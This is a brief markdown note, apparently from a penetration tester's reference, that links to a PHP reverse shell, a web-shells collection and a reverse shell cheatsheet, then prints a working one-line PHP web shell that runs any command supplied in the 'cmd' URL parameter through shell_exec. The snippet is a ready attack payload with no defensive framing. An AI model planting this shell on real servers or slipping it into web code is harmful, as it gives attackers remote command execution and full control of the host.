-   [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
-   [webshells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)
-   [reverse shell cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```
<?php echo "<pre>".shell_exec($_GET["cmd"])."</pre>"; ?>
```

